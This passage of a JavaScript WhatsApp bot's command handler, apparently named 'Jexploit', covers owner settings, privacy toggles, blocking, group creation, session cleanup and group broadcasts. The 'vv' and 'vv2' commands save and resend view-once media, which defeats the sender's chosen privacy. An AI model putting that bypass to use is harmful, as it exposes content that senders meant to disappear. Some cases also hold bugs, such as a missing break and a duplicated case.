    console.log(`Input: ${fullInput}, Extracted Number: ${newNumber}`); // Debug log

    if (newNumber.startsWith('0')) {
        return reply("⚠️ Phone numbers should not start with *0*. Use the full international format (e.g., *256...* instead of *07...*)");
    }

    if (newNumber.length < 5 || newNumber.length > 15) {
        return reply(`⚠️ Please provide a valid phone number (5-15 digits)\n\nYou provided: ${newNumber.length} digits: ${newNumber}`);
    }

    // Store the old number for comparison
    const oldNumber = await db.get(botNumber, 'ownernumber', 'Not set');

    // Update owner number in SQLite
    await db.set(botNumber, 'ownernumber', newNumber);

    // Update owner array in database
    const newOwnerJid = newNumber + "@s.whatsapp.net";
    const currentOwners = await db.get(botNumber, 'owners', []);
    
    // Add new owner to owners list if not already there
    if (!currentOwners.includes(newOwnerJid)) {
        currentOwners.push(newOwnerJid);
        await db.set(botNumber, 'owners', currentOwners);
    }

    // Update global for current session
    global.owner = [newOwnerJid];

    // Add to sudo if not already there
    const currentSudo = await db.getSudo(botNumber);
    if (!currentSudo.includes(newOwnerJid)) {
        await db.addSudo(botNumber, newOwnerJid);
    }

    reply(`✅ Owner number set to: ${newNumber}`);
    break;
}
case "setownername": {
    if (!Access) return reply(mess.owner);
    
    if (!text) {
        const currentName = await db.get(botNumber, 'ownername', 'Not set');
        return reply(`*SET OWNER NAME*\n\n*Usage:* ${prefix}setownername [new owner name]\n*Example:* ${prefix}setownername Kelvin Tech\n\n*Current owner name:* ${currentName}`);
    }

    try {
        // Validate name length
        if (text.length > 30) {
            return reply('❌ *Owner name too long!* Maximum 30 characters allowed.');
        }
        
        if (text.length < 2) {
            return reply('❌ *Owner name too short!* Minimum 2 characters required.');
        }

        // Set the new owner name in SQLite
        await db.set(botNumber, 'ownername', text.trim());

        // Update global for current session
        global.ownername = text.trim();

        reply(`✅ Owner name set to: ${text.trim()}`);

    } catch (error) {
        console.error('Error in setownername command:', error);
        reply('❌ *Failed to update owner name.* Please try again.');
    }
    break;
}
case "setbotname": {
    if (!Access) return reply(mess.owner);
    
    if (!text) {
        const currentName = await db.get(botNumber, 'botname', 'Not set');
        return reply(`*SET BOT NAME*\n\n*Usage:* ${prefix}setbotname [new name]\n*Example:* ${prefix}setbotname Jexploit Pro\n\n*Current bot name:* ${currentName}`);
    }

    try {
        // Validate name length
        if (text.length > 25) {
            return reply('❌ *Bot name too long!* Maximum 25 characters allowed.');
        }
        
        if (text.length < 2) {
            return reply('❌ *Bot name too short!* Minimum 2 characters required.');
        }

        // Set the new bot name in SQLite
        await db.set(botNumber, 'botname', text.trim());

        // Update global for current session
        global.botname = text.trim();

        reply(`✅ Bot name set to: ${text.trim()}`);

    } catch (error) {
        console.error('Error in setbotname command:', error);
        reply('❌ *Failed to update bot name.* Please try again.');
    }
    break;
}
break
case 'cekidch': case 'idch': {
if (!text) return reply("*channel link*")
if (!text.includes("https://whatsapp.com/channel/")) return reply("*In valid link*")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await conn.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total followers :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "*Verified*" : "*No*"}
`
return reply(teks)
}
break
case 'createch': {
    if (!Access) return m.reply("*Owner command only*");
    let parts = text.split('|');
    let channelName = parts[0]?.trim();
    let channelDesc = parts[1]?.trim() || '';
    if (!channelName) {
        return m.reply(`Example: 
${prefix + command} *ChannelName|ChannelDesc*`)}
    try {
        const metadata = await conn.newsletterCreate(channelName, channelDesc);
        console.log(metadata);
        console.log('Channel metadata:', JSON.stringify(metadata, null, 2));
        let channelId;
        if (metadata && metadata.channelId) {
            channelId = metadata.channelId;
        } else if (metadata && metadata.id) {
            channelId = metadata.id;
        } else if (metadata && metadata.channel && metadata.channel.id) {
            channelId = metadata.channel.id;
        } else if (typeof metadata === 'string') {
            channelId = metadata;
        } else {
            const findId = (obj) => {
                if (!obj || typeof obj !== 'object') return null;
                for (const key in obj) {
                    if (key === 'id' || key === 'channelId' || key.toLowerCase().includes('id')) {
                        return obj[key];
                    }
                    if (typeof obj[key] === 'object') {
                        const nestedId = findId(obj[key]);
                        if (nestedId) return nestedId;
                    }
                }
                return null;
            };      
            channelId = findId(metadata);
        }
        if (!channelId) {
            console.warn('Warning: ChannelId tidak ditemukan di response, menggunakan fallback...');
            channelId = "unknown-channel-id";
        }
        let successDetails = [];
        successDetails.push(`✅ Channel "${channelName}" `);
        if (channelDesc) {
            successDetails.push(`✅ Description Added`);
        }
        successDetails.push(`\nID Channel: ${channelId}`);
        await conn.sendMessage(m.chat, {
            text: successDetails.join('\n')
        });
    } catch (error) {
        console.error('Error creating channel:', error);
        m.reply(`${error.message}`);
    }
}
break
case "online": {
    if (!Access) return reply(mess.owner);
    if (!text) return reply(`Options: all/match_last_seen\nExample: ${prefix + command} all`);

    const validOptions = ["all", "match_last_seen"];
    if (!validOptions.includes(args[0])) return reply("Invalid option");

    await conn.updateOnlinePrivacy(text);
    await reply(mess.done);
}
break
case "'readreceipts": {
if (!Access) return reply(mess.owner);
    if (!text) return reply(`Options: all/none\nExample: ${prefix + command} all`);

    const validOptions = ["all", "none"];
    if (!validOptions.includes(args[0])) return reply("Invalid option");

    await conn.updateReadReceiptsPrivacy(text);
    await reply(mess.done);
}
break
case "setpp": {
    if (!Access) return reply(mess.owner);
    if (!quoted) return reply(`*Send or reply to an image With captions ${prefix + command}*`);
    if (!/image/.test(mime)) return reply(`*Send or reply to an image With captions ${prefix + command}*`);
    if (/webp/.test(mime)) return reply(`*Send or reply to an image With captions ${prefix + command}*`);

    const medis = await conn.downloadAndSaveMediaMessage(quoted, "ppbot.jpeg");

    if (args[0] === "full") {
      const { img } = await generateFullProfilePic(medis);
      await conn.query({
        tag: "iq",
        attrs: {
          to: botNumber,
          type: "set",
          xmlns: "w:profile:picture",
        },
        content: [
          {
            tag: "picture",
            attrs: {
              type: "image",
            },
            content: img,
          },
        ],
      });
      fs.unlinkSync(medis);
      reply(mess.done);
    } else {
      await conn.updateProfilePicture(botNumber, {
        url: medis,
      });
      fs.unlinkSync(medis);
      reply(mess.done);
    }
}
break
case "readreceipt":
case "readprivacy": {
    if (!Access) return reply(mess.owner);
    if (!text) return reply(`*Usage:* ${prefix + command} [option]\n\n*Options:* all, contacts, none\n*Example:* ${prefix + command} all`);

    const validOptions = ["all", "contacts", "none"];
    const option = args[0].toLowerCase();

    if (!validOptions.includes(option)) {
        return reply(`❌ *Invalid option!*\n\nValid options: ${validOptions.join(', ')}\nExample: ${prefix + command} all`);
    }

    try {
        await conn.updateReadReceiptsPrivacy(option);
        reply(`✅ *Read receipts privacy set to:* ${option.toUpperCase()}\n\n*What this means:*\n${getReadReceiptDescription(option)}`);
    } catch (error) {
        console.error('Error setting read receipts privacy:', error);
        reply('❌ *Failed to update read receipts settings.* Please try again.');
    }
}
break
case "setprofilename": {
    try {
        // Check if user is owner/bot admin
        const botNumber = await conn.decodeJid(conn.user.id);
        const sender = m.sender;
        const isOwner = global.owner.includes(sender.replace(/[^0-9]/g, '') + '@s.whatsapp.net');
        
        if (!Access) return reply(mess.owner);

        if (!text) {
            return m.reply(`⚠️ Please provide a name!\n\nUsage: *${prefix}case <new_profile_name>*\nExample: *${prefix}case My Awesome Bot*`);
        }

        // Limit name length to prevent errors
        if (text.length > 25) {
            return m.reply(`❌ Name too long! Maximum 25 characters allowed.`);
        }

        // Set the profile name
        await conn.updateProfileName(text);
        
        // Send success message
        await m.reply(`✅ Profile name updated successfully!\n\nNew Name: *${text}*`);
        
        // Optional: Add reaction to confirm
        await conn.sendMessage(m.chat, { 
            react: { 
                text: '✅', 
                key: m.key 
            } 
        });

        console.log(`Profile name changed to: ${text} by ${sender}`);

    } catch (error) {
        console.error('Error in case command:', error);
        m.reply(`❌ Failed to update profile name: ${error.message}`);
    }
}
break
case "lastseen": {
    if (!Access) return reply(mess.owner);
    if (!text) return reply(`*Usage:* ${prefix + command} [option]\n\n*Options:* all, contacts, contact_blacklist, none\n*Example:* ${prefix + command} all`);

    const validOptions = ["all", "contacts", "contact_blacklist", "none"];
    const option = args[0].toLowerCase();

    if (!validOptions.includes(option)) {
        return reply(`❌ *Invalid option!*\n\nValid options: ${validOptions.join(', ')}\nExample: ${prefix + command} all`);
    }

    try {
        await conn.updateLastSeenPrivacy(option);
        reply(`✅ *Last seen privacy set to:* ${option.toUpperCase()}\n\n*What this means:*\n${getLastSeenDescription(option)}`);
    } catch (error) {
        console.error('Error setting last seen privacy:', error);
        reply('❌ *Failed to update last seen settings.* Please try again.');
    }
   
}
break
case "gcprivacy":
case "gcaddprivacy": {
    if (!Access) return reply(mess.owner);
    if (!text) return reply(`*Usage:* ${prefix + command} [option]\n\n*Options:* all, contacts, contact_blacklist\n*Example:* ${prefix + command} all`);

    const validOptions = ["all", "contacts", "contact_blacklist"];
    const option = args[0].toLowerCase();

    if (!validOptions.includes(option)) {
        return reply(`❌ *Invalid option!*\n\nValid options: ${validOptions.join(', ')}\nExample: ${prefix + command} all`);
    }

    try {
        await conn.updateGroupsAddPrivacy(option);
        reply(`✅ *Group add privacy set to:* ${option.toUpperCase()}\n\n*What this means:*\n${getGroupAddDescription(option)}`);
    } catch (error) {
        console.error('Error setting group add privacy:', error);
        reply('❌ *Failed to update group add settings.* Please try again.');
    }
    
}
break
case "online": {
    if (!Access) return reply(mess.owner);
    if (!text) return reply(`*Usage:* ${prefix + command} [option]\n\n*Options:* all, match_last_seen\n*Example:* ${prefix + command} all`);

    const validOptions = ["all", "match_last_seen"];
    const option = args[0].toLowerCase();

    if (!validOptions.includes(option)) {
        return reply(`❌ *Invalid option!*\n\nValid options: ${validOptions.join(', ')}\nExample: ${prefix + command} all`);
    }

    try {
        await conn.updateOnlinePrivacy(option);
        reply(`✅ *Online privacy set to:* ${option.toUpperCase()}\n\n*What this means:*\n${getOnlineDescription(option)}`);
    } catch (error) {
        console.error('Error setting online privacy:', error);
        reply('❌ *Failed to update online status settings.* Please try again.');
    }
    
}
break
case "ppprivacy": {
    if (!Access) return reply(mess.owner);
    if (!text) return reply(`*Usage:* ${prefix + command} [option]\n\n*Options:* all, contacts, contact_blacklist, none\n*Example:* ${prefix + command} all`);

    const validOptions = ["all", "contacts", "contact_blacklist", "none"];
    const option = args[0].toLowerCase();

    if (!validOptions.includes(option)) {
        return reply(`❌ *Invalid option!*\n\nValid options: ${validOptions.join(', ')}\nExample: ${prefix + command} all`);
    }

    try {
        await conn.updateProfilePicturePrivacy(option);
        reply(`✅ *Profile picture privacy set to:* ${option.toUpperCase()}\n\n*What this means:*\n${getProfilePictureDescription(option)}`);
    } catch (error) {
        console.error('Error setting profile picture privacy:', error);
        reply('❌ *Failed to update profile picture privacy settings.* Please try again.');
    }
    
}
break 
case "delete":
case "del": {
if (!Access) return reply(mess.owner);
    if (!m.quoted) return reply(`*Please reply to a message*`);

    try {
     
      await conn.sendMessage(m.chat, {
        delete: {
          remoteJid: m.quoted.fakeObj.key.remoteJid,
          fromMe: m.quoted.fakeObj.key.fromMe,
          id: m.quoted.fakeObj.key.id,
          participant: m.quoted.fakeObj.participant,
        }
      });

      
      await conn.sendMessage(m.chat, {
        delete: {
          remoteJid: m.key.remoteJid,
          fromMe: m.key.fromMe,
          id: m.key.id,
          participant: m.key.participant,
        }
      });

    } catch (err) {
      console.error(err);
      reply("⚠️ Failed to delete message.");
   }

}
break
case "react": {
if (!Access) return reply(mess.owner);
    if (!args) return reply(`*Reaction emoji needed*\n Example .react 🤔`);

    const reactionMessage = {
      react: {
        text: args[0],
        key: { remoteJid: m.chat, fromMe: true, id: quoted.id },
      },
    };
    conn.sendMessage(m.chat, reactionMessage);
}
break
case "vv2": {
if (!Access) return reply(mess.owner);
    if (!quoted) return reply(`*Reply to an Image or Video*`);

    let msg = m.quoted.fakeObj.message
    let type = Object.keys(msg)[0]
    if (!msg[type].viewOnce && m.quoted.mtype !== "viewOnceMessageV2") return m.reply("message not viewonce!")
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return conn.sendMessage(m.chat, { video: buffer, caption: msg[type].caption || "" }, { quoted: m })
    } else if (/image/.test(type)) {
        return conn.sendMessage(m.chat, { image: buffer, caption: msg[type].caption || "" }, { quoted: m })
    } else if (/audio/.test(type)) {
        return conn.sendMessage(m.chat, { audio: buffer, mimetype: "audio/mpeg", ptt: true }, { quoted: m })
    }
}
break
case 'creategc': 
case 'creategroup': {
if (!Access) return reply(mess.owner)
if (!args.join(" ")) return reply(`*Example: ${prefix + command} Jexploit updats*`);
try {
let cret = await conn.groupCreate(args.join(" "), [])
let response = await conn.groupInviteCode(cret.id)
const teksop = `     「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}`
conn.sendMessage(m.chat, { text:teksop, mentions: await conn.parseMention(teksop)}, {quoted:m})
} catch {
	reply(mess.done)
	}
}
break
case "gpass": {
let length = text ? parseInt(text) : 12;
    let chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+";
    let pass = "";
    for (let i = 0; i < length; i++) {
      pass += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    
    try {
      conn.sendMessage(m.chat, { text: pass }, { quoted: m });
    } catch (error) {
      console.error('Error generating password:', error);
      reply('An error occurred while generating the password.');
    }
}
break
case "block": {
if (!Access) return reply(mess.owner);
    if (!m.quoted && !m.mentionedJid[0] && !text) return reply("Reply to a message or mention/user ID to block");

    const userId = m.mentionedJid[0] || m.quoted?.sender || text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    await conn.updateBlockStatus(userId, "block");
    reply(mess.done);
}
break
case "public": {
if (!Access) return reply(mess.owner) 
conn.public = true
reply(`*${global.botname} successfully changed to public mode*.`)
}
break
case 'readviewonce': case 'vv': {
if (!Access) return reply(mess.owner) 
    try {
        if (!m.quoted) return reply('*Please reply to a viewonce Media!*');

        const quotedMessage = m.msg.contextInfo.quotedMessage;
        if (!quotedMessage) return reply('❌ No media found in the quoted message.');

        if (quotedMessage.imageMessage) {
            let imageCaption = quotedMessage.imageMessage.caption || '';
            let imageUrl = await conn.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
            await conn.sendMessage(m.chat, { image: { url: imageUrl }, caption: imageCaption });
        }

        if (quotedMessage.videoMessage) {
            let videoCaption = quotedMessage.videoMessage.caption || '';
            let videoUrl = await conn.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
            await conn.sendMessage(m.chat, { video: { url: videoUrl }, caption: videoCaption });
        }

        if (quotedMessage.audioMessage) {
            let audioUrl = await conn.downloadAndSaveMediaMessage(quotedMessage.audioMessage);
            await conn.sendMessage(m.chat, { audio: { url: audioUrl }, mimetype: 'audio/mp4' });
        }

    } catch (error) {
        console.error('Error processing vv command:', error);
        reply('❌ An error occurred while processing your request.');
    }
    
}
break
case "listblocked": {
if (!Access) return reply(mess.owner);

    try {
      const blockedList = await conn.fetchBlocklist();

      if (!blockedList.length) {
        return reply('✅ No contacts are currently blocked.');
      }

      let blockedUsers = blockedList.map((user, index) => `🔹 *${index + 1}.* @${user.split('@')[0]}`).join('\n');

      await conn.sendMessage(m.chat, {
        text: `🚫 *Blocked Contacts:*\n\n${blockedUsers}`,
        mentions: blockedList
      }, { quoted: m });

    } catch (error) {
      reply('⚠️ Unable to fetch blocked contacts.');
  }
}
break
case "unblock": {
if (!Access) return reply(mess.owner);
    if (!m.quoted && !m.mentionedJid[0] && !text) return reply("Reply to a message or mention/user ID to unblock");

    const userId = m.mentionedJid[0] || m.quoted?.sender || text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    await conn.updateBlockStatus(userId, "unblock");
    reply(mess.done);
}
break
case "restart":
case "reboot": {
    if (!Access) return reply(mess.owner);
    
    try {
        await reply(`*Restarting ${global.botname} Bot...*\n\nPlease wait 10-15 seconds for the bot to restart.`);
        
        // A small delay to ensure the message is sent
        await sleep(2000);
        
        // Close the connection gracefully first
        if (conn && typeof conn.end === 'function') {
            await conn.end();
        }
        
        console.log(chalk.yellow.bold(`Bot restart initiated by ${pushname} (${m.sender})`));
        
        // Restart the process
        process.exit(0);
        
    } catch (error) {
        console.error('Error during restart:', error);
        reply('❌ *Failed to restart bot.* Please restart manually.');
    }
}
break
case "addignorelist": {
if (!Access) return reply(mess.owner);

    let mentionedUser = m.mentionedJid && m.mentionedJid[0];
    let quotedUser = m.quoted && m.quoted.sender;
    let userToAdd = mentionedUser || quotedUser || m.chat;

    if (!userToAdd) return reply('Mention a user, reply to their message, or provide a phone number to ignore.');

    let blacklist = loadBlacklist();
    if (!blacklist.blacklisted_numbers.includes(userToAdd)) {
        blacklist.blacklisted_numbers.push(userToAdd);
        reply(`${userToAdd} added to the ignore list.`);
    } else {
        reply(`${userToAdd} is already ignored.`);
    }
}
break
case "delignorelist": {
    if (!Access) return reply(mess.owner);

    let mentionedUser = m.mentionedJid && m.mentionedJid[0];
    let quotedUser = m.quoted && m.quoted.sender;
    let userToRemove = mentionedUser || quotedUser || m.chat;

    if (!userToRemove) return reply('Mention a user, reply to their message, or provide a phone number to remove from the ignore list.');

    let blacklist = loadBlacklist();
    let index = blacklist.blacklisted_numbers.indexOf(userToRemove);
    if (index !== -1) {
        blacklist.blacklisted_numbers.splice(index, 1);
        reply(`${userToRemove} removed from the ignore list.`);
    } else {
        reply(`${userToRemove} is not in the ignore list.`);
    }
}
break
case "listignored": {
let blacklist = loadBlacklist();
    if (blacklist.blacklisted_numbers.length === 0) {
        reply('The ignore list is empty.');
    } else {
        reply(`Ignored users/chats:\n${blacklist.blacklisted_numbers.join('\n')}`);
    }
}
break
case "deletejunk": 
case "deljunk": {
if (!Access) return reply(mess.owner);
    fsp.readdir("./session", async function (err, files) {
      if (err) {
        console.log("Unable to scan directory: " + err);
        return reply("Unable to scan directory: " + err);
      }
      let filteredArray = await files.filter(
        (item) =>
          item.startsWith("pre-key") ||
          item.startsWith("sender-key") ||
          item.startsWith("session-") ||
          item.startsWith("app-state")
      );
      console.log(filteredArray.length);
      await sleep(2000);
      reply(`*Clearing ${filteredArray.length} junk files in the session folder...*`);
      await filteredArray.forEach(function (file) {
        fs.unlinkSync(`./session/${file}`);
      });
      await sleep(2000);
      reply("*Successfully cleared all the junk files in the session's folder*");
    });

    const tmpDir = path.resolve("./tmp");
    fsp.readdir(tmpDir, async function (err, files) {
      if (err) {
        console.log("Unable to scan directory: " + err);
        return reply("Unable to scan directory: " + err);
      }
      let junkFiles = files.filter(
        (item) =>
          item.endsWith("gif") ||
          item.endsWith("png") || 
          item.endsWith("mp3") ||
          item.endsWith("mp4") || 
          item.endsWith("opus") || 
          item.endsWith("jpg") ||
          item.endsWith("webp") ||
          item.endsWith("webm") ||
          item.endsWith("zip")
      );
      console.log(junkFiles.length);
      await sleep(2000);
      reply(`*Clearing ${junkFiles.length} junk files in the tmp folder...*`);
      await junkFiles.forEach(function (file) {
        fs.unlinkSync(`${tmpDir}/${file}`);
      });
      await sleep(2000);
      reply("*Successfully cleared all the junk files in the tmp folder*");
    });
}
break
case "cleansession":
case "cleanjunk":
case "clean": {
    if (!Access) return reply(mess.owner);
    
    try {
        reply("*Starting session cleanup...*");
        
        // Clean session files using your function
        cleaningSession("./session");
        
        // Wait and send success message
        setTimeout(() => {
            reply("✅ *Session files cleaned successfully!*\n\n" +
                  "• Removed old session files (>2 hours)\n" +
                  "• Preserved credentials (creds.json)\n" +
                  "• Temporary files cleared");
        }, 2000);
        
    } catch (error) {
        console.error("Error in cleansession command:", error);
        reply("*Error: " + error.message + "*");
    }
    
}
case 'autoviewstatus':
case 'viewstatus': {
    if (!Access) return reply(mess.owner);
    
    const mode = args[0]?.toLowerCase();
    if (!mode || !['on', 'off'].includes(mode)) {
        const current = await db.get(botNumber, 'autoviewstatus', false);
        return reply(`❌ Usage: ${prefix}autoviewstatus <on/off>\n\nCurrent: ${current ? 'ON ✅' : 'OFF ❌'}`);
    }
    
    const boolValue = mode === 'on';
    await db.set(botNumber, 'autoviewstatus', boolValue);
    reply(`✅ Auto-view status ${boolValue ? 'enabled' : 'disabled'}`);
    break;
}
case 'autoreactstatus':
case 'reactstatus': {
    if (!Access) return reply(mess.owner);
    
    const mode = args[0]?.toLowerCase();
    if (!mode || !['on', 'off'].includes(mode)) {
        const current = await db.get(botNumber, 'autoreactstatus', false);
        return reply(`❌ Usage: ${prefix}autoreactstatus <on/off>\n\nCurrent: ${current ? 'ON ✅' : 'OFF ❌'}`);
    }
    
    const boolValue = mode === 'on';
    await db.set(botNumber, 'autoreactstatus', boolValue);
    reply(`✅ Auto-react status ${boolValue ? 'enabled' : 'disabled'}`);
    break;
}
case 'statusemoji':
case 'setstatusemoji': {
    if (!Access) return reply(mess.owner);
    
    const emoji = args[0];
    if (!emoji) {
        const current = await db.get(botNumber, 'statusemoji', '💚');
        return reply(`❌ Usage: ${prefix}statusemoji <emoji>\n\nCurrent: ${current}\nExample: ${prefix}statusemoji ❤️`);
    }
    
    await db.set(botNumber, 'statusemoji', emoji);
    reply(`✅ Status reaction emoji set to: ${emoji}`);
    break;
}
case 'welcome': {
    if (!m.isGroup) return reply(mess.group);
    if (!m.isAdmin && !Access) return reply(mess.notadmin);
    
    const mode = args[0]?.toLowerCase();
    if (!mode || !['on', 'off'].includes(mode)) {
        const current = await db.getGroupSetting(botNumber, m.chat, 'welcome', false);
        return reply(`❌ Usage: ${prefix}welcome <on/off>\n\nCurrent: ${current ? 'ON ✅' : 'OFF ❌'}`);
    }
    
    const boolValue = mode === 'on';
    await db.setGroupSetting(botNumber, m.chat, 'welcome', boolValue);
    reply(`✅ Welcome messages ${boolValue ? 'enabled' : 'disabled'} for this group`);
    break;
}
case 'adminevent': {
    if (!Access) return reply(mess.owner);
    
    const mode = args[0]?.toLowerCase();
    if (!mode || !['on', 'off'].includes(mode)) {
        const current = await db.get(botNumber, 'adminevent', false);
        return reply(`❌ Usage: ${prefix}adminevent <on/off>\n\nCurrent: ${current ? 'ON ✅' : 'OFF ❌'}`);
    }
    
    const boolValue = mode === 'on';
    await db.set(botNumber, 'adminevent', boolValue);
    reply(`✅ Admin event notifications ${boolValue ? 'enabled' : 'disabled'}`);
    break;
}
case 'anticall': {
    if (!Access) return reply(mess.owner);
    
    const mode = args[0]?.toLowerCase();
    const action = args[1]?.toLowerCase();
    
    // Show help if no arguments
    if (!mode) {
        const current = await db.get(botNumber, 'anticall', 'off');
        return reply(`*ANTICALL*\n\n` +
            `• ${prefix}anticall decline on\n` +
            `• ${prefix}anticall decline off\n` +
            `• ${prefix}anticall block on\n` +
            `• ${prefix}anticall block off\n\n` +
            `Current: ${current}`);
    }
    
    // Handle decline mode
    if (mode === 'decline') {
        if (action === 'on') {
            await db.set(botNumber, 'anticall', 'decline');
            return reply('✅ Anticall ON (calls will be declined)');
        }
        if (action === 'off') {
            await db.set(botNumber, 'anticall', 'off');
            return reply('❌ Anticall OFF');
        }
    }
    
    // Handle block mode
    if (mode === 'block') {
        if (action === 'on') {
            await db.set(botNumber, 'anticall', 'block');
            return reply('✅ Anticall BLOCK ON (callers will be blocked)');
        }
        if (action === 'off') {
            await db.set(botNumber, 'anticall', 'off');
            return reply('❌ Anticall OFF');
        }
    }
    
    // Invalid command
    reply('❌ Use: .anticall decline on/off or .anticall block on/off');
    break;
}
case "settings":
case "botsettings":
case "status": {
    if (!Access) return reply(mess.owner);
    
    // Fetch all settings from SQLite
    const [
        prefix,
        alwaysonline,
        antidelete,
        antiedit,
        anticall,
        antilinkdelete,
        antilinkaction,
        antibadword,
        antibadwordaction,
        antitag,
        antitagaction,
        autorecording,
        autoTyping,
        autoread,
        autoreact,
        AI_CHAT,
        autoviewstatus,
        autoreactstatus,
        statusemoji,
        welcome,
        adminevent
    ] = await Promise.all([
        db.get(botNumber, 'prefix', '.'),
        db.get(botNumber, 'alwaysonline', false),
        db.get(botNumber, 'antidelete', 'off'),
        db.get(botNumber, 'antiedit', 'off'),
        db.get(botNumber, 'anticall', 'off'),
        db.get(botNumber, 'antilink', false),
        db.get(botNumber, 'antilinkaction', 'delete'),
        db.get(botNumber, 'antibadword', false),
        db.get(botNumber, 'antibadwordaction', 'delete'),
        db.get(botNumber, 'antitag', false),
        db.get(botNumber, 'antitagaction', 'delete'),
        db.get(botNumber, 'autorecording', false),
        db.get(botNumber, 'autoTyping', false),
        db.get(botNumber, 'autoread', false),
        db.get(botNumber, 'autoreact', false),
        db.get(botNumber, 'AI_CHAT', false),
        db.get(botNumber, 'autoviewstatus', false),
        db.get(botNumber, 'autoreactstatus', false),
        db.get(botNumber, 'statusemoji', '💚'),
        db.get(botNumber, 'welcome', false),
        db.get(botNumber, 'adminevent', false)
    ]);

    let settingsMsg = `*📊 BOT SETTINGS STATUS*\n\n`;
    settingsMsg += `🔸 Prefix: ${prefix}\n`;
    settingsMsg += `🔸 Always Online: ${alwaysonline ? 'True' : 'False'}\n`;
    settingsMsg += `🔸 Anti-Delete: ${antidelete !== 'off' ? 'True (' + antidelete + ')' : 'False'}\n`;
    settingsMsg += `🔸 Anti-Edit: ${antiedit !== 'off' ? 'True (' + antiedit + ')' : 'False'}\n`;
    settingsMsg += `🔸 Anti-Call: ${anticall !== 'off' ? 'True (' + anticall + ')' : 'False'}\n`;
    settingsMsg += `🔸 Anti-Link: ${antilinkdelete ? 'True (' + antilinkaction + ')' : 'False'}\n`;
    settingsMsg += `🔸 Anti-Badword: ${antibadword ? 'True (' + antibadwordaction + ')' : 'False'}\n`;
    settingsMsg += `🔸 Anti-Tag: ${antitag ? 'True (' + antitagaction + ')' : 'False'}\n`;
    settingsMsg += `🔸 Auto-Recording: ${autorecording ? 'True' : 'False'}\n`;
    settingsMsg += `🔸 Auto-Typing: ${autoTyping ? 'True' : 'False'}\n`;
    settingsMsg += `🔸 Auto-Read: ${autoread ? 'True' : 'False'}\n`;
    settingsMsg += `🔸 Auto-React: ${autoreact ? 'True' : 'False'}\n`;
    settingsMsg += `🔸 AI Chatbot: ${AI_CHAT ? 'True' : 'False'}\n`;
    settingsMsg += `🔸 Auto-View Status: ${autoviewstatus ? 'True' : 'False'}\n`;
    settingsMsg += `🔸 Auto-React Status: ${autoreactstatus ? 'True (' + statusemoji + ')' : 'False'}\n`;
    settingsMsg += `🔸 Welcome Message: ${welcome ? 'True' : 'False'}\n`;
    settingsMsg += `🔸 Admin Events: ${adminevent ? 'True' : 'False'}`;
    
    reply(settingsMsg);
    break;
}
case "getpp": {
    if (!Access) return reply(mess.owner);
    if (!m.quoted) {
        // React with 📷 even if no user is quoted
        await conn.sendMessage(m.chat, {
            react: {
                text: "📷",
                key: m.key
            }
        });
        return reply('Reply to a user to get their profile picture.');
    }

    // React with 📷 emoji to the command message
    await conn.sendMessage(m.chat, {
        react: {
            text: "📷",
            key: m.key
        }
    });

    const userId = m.quoted.sender;

    try {
        const ppUrl = await conn.profilePictureUrl(userId, 'image');

        await conn.sendMessage(m.chat, 
            { 
                image: { url: ppUrl }, 
                caption: `⌘ *Profile Picture of:* @${userId.split('@')[0]}`,
                mentions: [ userId ]
            }, { quoted: m }); 
    } catch {
        await conn.sendMessage(m.chat, { 
            image: { url: 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60' }, 
            caption: '⚠️ No profile picture found.' 
        }, { quoted: m });
    }
}
break
case "update":
case "botupdate":
case "upgrade": {
    if (!Access) return reply(mess.owner);
    
    try {
        const updateCommand = require('./lib/update');
        await updateCommand(conn, Access, m.chat, m);
    } catch (err) {
        console.error('Update error:', err);
        reply(`*Update failed:* ${err.message}`);
    }
    
}
break
case "toviewonce": {
if (!Access) return reply(mess.owner);
    if (!quoted) return reply(`*Reply to an Image or Video*`);

    if (/image/.test(mime)) {
      const anuan = await conn.downloadAndSaveMediaMessage(quoted);
      conn.sendMessage(
        m.chat,
        {
          image: { url: anuan },
          caption: mess.done,
          fileLength: "999",
          viewOnce: true
        },
        { quoted: m }
      );
    } else if (/video/.test(mime)) {
      const anuanuan = await conn.downloadAndSaveMediaMessage(quoted);
      conn.sendMessage(
        m.chat,
        {
          video: { url: anuanuan },
          caption: mess.done,
          fileLength: "99999999",
          viewOnce: true
        },
        { quoted: m }
      );
    } else if (/audio/.test(mime)) {
      const bebasap = await conn.downloadAndSaveMediaMessage(quoted);
      conn.sendMessage(m.chat, {
        audio: { url: bebasap },
        mimetype: "audio/mpeg",
        ptt: true,
        viewOnce: true
      });
   }
}
break
case "private": {
if (!Access) return reply(mess.owner) 
conn.public = false
reply(`*${global.botname} successfully changed to private mode*.`)
}
break
case "join": {
if (!Access) return reply(mess.owner);
    if (!text) return reply("Enter group link");
    if (!isUrl(args[0]) && !args[0].includes("whatsapp.com")) return reply("Invalid link");

    try {
      const link = args[0].split("https://chat.whatsapp.com/")[1];
      await conn.groupAcceptInvite(link);
      reply("Joined successfully");
    } catch {
      reply("Failed to join group");
    }
}
break
case "broadcast": {
if (!Access) return reply(mess.owner);
    if (args.length === 0) return reply("📢 Please provide a message to broadcast.");
    const message = args.join(' ');
    const groups = Object.keys(await conn.groupFetchAllParticipating());
    for (const groupId of groups) {
        await conn.sendMessage(groupId, { text: message }, { quoted: mek });
    }
    reply("📢 Message broadcasted to all groups.");
}
break
case "groupjids": {
    if (!Access) return reply("*Your are not my owner* 😜!");
    const groups = await conn.groupFetchAllParticipating();
